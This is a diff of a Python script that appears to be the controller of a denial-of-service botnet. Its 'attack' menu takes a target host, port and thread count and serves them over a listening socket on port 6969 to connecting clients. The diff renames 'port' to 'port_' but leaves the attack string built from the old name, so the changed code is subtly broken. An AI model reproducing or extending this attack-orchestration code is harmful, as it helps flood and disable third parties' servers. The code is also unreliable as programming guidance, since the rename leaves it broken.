@@ -27,9 +27,9 @@ def main():
 
     if menu == "1": # attack
         target = input(">Please input the IP or the Host name to Attack>> ")
-        port = input(">Please input the port (80 by default)>> ")
-        if port == "":
-            port = "80"
+        port_ = input(">Please input the port (80 by default)>> ")
+        if port_ == "":
+            port_ = "80"
         threads = input(">Please input the numbrer of threads you want>> ")
 
         sendData = (target + ":" + port + ":" + threads)
@@ -39,9 +39,9 @@ def main():
 
 
         host = ""#put your server ip here
-        port = 6969
+        port_ = 6969
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((host, port))
+        s.bind((host, port_))
         sendData = sendData.encode("utf8")
         while True:
             s.listen(10)
